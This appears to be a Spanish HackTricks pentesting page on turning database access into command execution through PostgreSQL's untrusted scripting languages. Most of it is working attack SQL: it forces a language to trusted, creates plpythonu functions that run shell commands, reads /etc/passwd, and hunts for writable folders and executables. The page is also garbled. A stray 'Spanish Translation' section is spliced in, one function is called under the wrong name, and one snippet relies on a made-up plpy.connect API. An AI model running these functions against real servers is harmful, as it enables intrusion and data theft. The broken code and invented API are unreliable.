## Lenguajes de PostgreSQL

Es posible que la base de datos PostgreSQL a la que has obtenido acceso tenga diferentes **lenguajes de scripting instalados** que podrías abusar para **ejecutar código arbitrario**.

Puedes **ponerlos en marcha**:
```sql
\dL *

SELECT lanname,lanpltrusted,lanacl FROM pg_language;
```
La mayoría de los lenguajes de script que se pueden instalar en PostgreSQL tienen **2 variantes**: la **confiable** y la **no confiable**. La **no confiable** tendrá un nombre **que termina en "u"** y será la versión que te permitirá **ejecutar código** y usar otras funciones interesantes. Estos son algunos de los lenguajes que resultan interesantes si se instalan:

* **plpythonu**
* **plpython3u**
* **plperlu**
* **pljavaU**
* **plrubyu**
* ... (cualquier otro lenguaje de programación que use una versión insegura)

{% hint style="warning" %}
Si encuentras que un lenguaje interesante está **instalado** pero es **no confiable** según PostgreSQL (**`lanpltrusted`** es **`false`**), puedes intentar **confiar en él** con la siguiente línea para que no se apliquen restricciones por parte de PostgreSQL:
```sql
UPDATE pg_language SET lanpltrusted=true WHERE lanname='plpythonu';
# To check your permissions over the table pg_language
SELECT * FROM information_schema.table_privileges WHERE table_name = 'pg_language';
```
{% endhint %}

{% hint style="danger" %}
Si no ves un lenguaje, puedes intentar cargarlo con (**necesitas ser superadmin**):
```
CREATE EXTENSION plpythonu;
CREATE EXTENSION plpython3u;
CREATE EXTENSION plperlu;
CREATE EXTENSION pljavaU;
CREATE EXTENSION plrubyu;
```
{% endhint %}

Ten en cuenta que es posible compilar las versiones seguras como "inseguras". Mira [**esto**](https://www.robbyonrails.com/articles/2005/08/22/installing-untrusted-pl-ruby-for-postgresql.html) por ejemplo. Así que siempre vale la pena intentarlo si puedes ejecutar código aunque solo encuentres la versión **confiable**.

## plpythonu/plpython3u
```sql
CREATE OR REPLACE FUNCTION exec (cmd text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    return os.popen(cmd).read()
    #return os.execve(cmd, ["/usr/lib64/pgsql92/bin/psql"], {})
$$
LANGUAGE 'plpythonu';

SELECT cmd("ls"); #RCE with popen or execve
```
{% endtab %}

{% tab title="Obtener usuario del sistema operativo" %}
```sql
CREATE OR REPLACE FUNCTION get_user (pkg text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    return os.getlogin()
$$
LANGUAGE 'plpythonu';

SELECT get_user(""); #Get user, para is useless
```
{% endtab %}

{% tab title="Listar directorio" %}
```sql
CREATE OR REPLACE FUNCTION lsdir (dir text)
RETURNS VARCHAR(65535) stable
AS $$
    import json
    from os import walk
    files = next(walk(dir), (None, None, []))
    return json.dumps({"root": files[0], "dirs": files[1], "files": files[2]})[:65535]
$$
LANGUAGE 'plpythonu';

SELECT lsdir("/"); #List dir
```
{% endtab %}

{% tab title="Encontrar la carpeta W" %}
```sql
CREATE OR REPLACE FUNCTION findw (dir text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        writables = []
        def find_writable(path):
            if not os.path.isdir(path):
                return
            if os.access(path, os.W_OK):
                writables.append(path)
            if not os.listdir(path):
                return
            else:
                for item in os.listdir(path):
                    find_writable(os.path.join(path, item))
        find_writable(path)
        return writables
    
    return ", ".join(my_find(dir))
$$
LANGUAGE 'plpythonu';

SELECT findw("/"); #Find Writable folders from a folder (recursively)
```
{% endtab %}

{% tab title="Encontrar archivo" %}
```sql
CREATE OR REPLACE FUNCTION find_file (exe_sea text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        executables = []
        def find_executables(path):
            if not os.path.isdir(path):
                executables.append(path)
            
            if os.path.isdir(path):
                if not os.listdir(path):
                    return
                else:
                    for item in os.listdir(path):
                        find_executables(os.path.join(path, item))
        find_executables(path)
        return executables
    
    a = my_find("/")
    b = []

    for i in a:
        if exe_sea in os.path.basename(i):
            b.append(i)
    return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT find_file("psql"); #Find a file
```
{% endtab %}

{% tab title="Encontrar ejecutables" %}
```sql
CREATE OR REPLACE FUNCTION findx (dir text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        executables = []
        def find_executables(path):
            if not os.path.isdir(path) and os.access(path, os.X_OK):
                executables.append(path)
            
            if os.path.isdir(path):
                if not os.listdir(path):
                    return
                else:
                    for item in os.listdir(path):
                        find_executables(os.path.join(path, item))
        find_executables(path)
        return executables
    
    a = my_find(dir)
    b = []

    for i in a:
        b.append(os.path.basename(i))
    return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT findx("/"); #Find an executables in folder (recursively)
```
{% endtab %}

{% tab title="Encontrar exec por sustitución" %}
```sql
CREATE OR REPLACE FUNCTION find_exe (exe_sea text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        executables = []
        def find_executables(path):
            if not os.path.isdir(path) and os.access(path, os.X_OK):
                executables.append(path)
            
            if os.path.isdir(path):
                if not os.listdir(path):
                    return
                else:
                    for item in os.listdir(path):
                        find_executables(os.path.join(path, item))
        find_executables(path)
        return executables
    
    a = my_find("/")
    b = []

    for i in a:
        if exe_sea in i:
            b.append(i)
    return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT find_exe("psql"); #Find executable by susbstring
```
{% endtab %}

{% tab title="Spanish Translation" %}
# RCE con lenguajes de PostgreSQL

PostgreSQL admite varios lenguajes de programación que se pueden utilizar para escribir funciones almacenadas. Algunos de estos lenguajes son:

* PL/pgSQL
* PL/Python
* PL/Perl
* PL/Tcl
* PL/Java
* PL/JavaScript

Si un atacante tiene permisos para crear funciones almacenadas, puede utilizar estos lenguajes para ejecutar código arbitrario en el servidor de la base de datos. Esto se puede hacer de varias maneras:

## Ejecución de comandos del sistema

En algunos casos, los lenguajes de programación de PostgreSQL permiten la ejecución de comandos del sistema. Por ejemplo, en PL/Python se puede utilizar el módulo `os` para ejecutar comandos del sistema:

```sql
CREATE OR REPLACE FUNCTION rce() RETURNS text AS $$
import os
os.system('id > /tmp/output')
with open('/tmp/output', 'r') as f:
    return f.read()
$$ LANGUAGE plpythonu;
```

Esta función crea un archivo `/tmp/output` con la salida del comando `id`. El atacante puede leer el contenido de este archivo para obtener la salida del comando.

## Ejecución de código arbitrario

En otros casos, los lenguajes de programación de PostgreSQL permiten la ejecución de código arbitrario. Por ejemplo, en PL/Python se puede utilizar la función `eval` para ejecutar código arbitrario:

```sql
CREATE OR REPLACE FUNCTION rce() RETURNS text AS $$
import os
eval("os.system('id > /tmp/output')")
with open('/tmp/output', 'r') as f:
    return f.read()
$$ LANGUAGE plpythonu;
```

Esta función es similar a la anterior, pero utiliza la función `eval` para ejecutar el comando `os.system('id > /tmp/output')`. El atacante puede utilizar esta técnica para ejecutar cualquier código arbitrario en el servidor de la base de datos.

## Ejecución de código en el contexto del servidor de la base de datos

En algunos casos, los lenguajes de programación de PostgreSQL permiten la ejecución de código en el contexto del servidor de la base de datos. Por ejemplo, en PL/Python se puede utilizar la función `plpy` para interactuar con la base de datos:

```sql
CREATE OR REPLACE FUNCTION rce() RETURNS text AS $$
import plpy
conn = plpy.connect("dbname=mydb user=myuser password=mypass")
result = conn.execute("SELECT * FROM mytable")
return str(result)
$$ LANGUAGE plpythonu;
```

Esta función utiliza la función `plpy.connect` para conectarse a la base de datos y la función `conn.execute` para ejecutar una consulta SQL. El atacante puede utilizar esta técnica para leer o modificar datos en la base de datos.
```sql
CREATE OR REPLACE FUNCTION read (path text)
RETURNS VARCHAR(65535) stable
AS $$
    import base64
    encoded_string= base64.b64encode(open(path).read())
    return encoded_string.decode('utf-8')
    return open(path).read()
$$
LANGUAGE 'plpythonu';

select read('/etc/passwd'); #Read a file in b64
```
{% endtab %}

{% tab title="Obtener permisos" %}
```sql
CREATE OR REPLACE FUNCTION get_perms (path text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    status = os.stat(path)
    perms = oct(status.st_mode)[-3:]
    return str(perms)
$$
LANGUAGE 'plpythonu';

select get_perms("/etc/passwd"); # Get perms of file
```
{% endtab %}

{% tab title="Petición" %}
```sql
CREATE OR REPLACE FUNCTION req2 (url text)
RETURNS VARCHAR(65535) stable
AS $$
    import urllib
    r = urllib.urlopen(url)
    return r.read()
$$
LANGUAGE 'plpythonu';

SELECT req2('https://google.com'); #Request using python2

CREATE OR REPLACE FUNCTION req3 (url text)
RETURNS VARCHAR(65535) stable
AS $$
    from urllib import request
    r = request.urlopen(url)
    return r.read()
$$
LANGUAGE 'plpythonu';

SELECT req3('https://google.com'); #Request using python3
```
{% endtab %}
{% endtabs %}

## pgSQL

Revisa la siguiente página:

{% content-ref url="pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## C

Revisa la siguiente página:

{% content-ref url="rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](rce-with-postgresql-extensions.md)
{% endcontent-ref %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
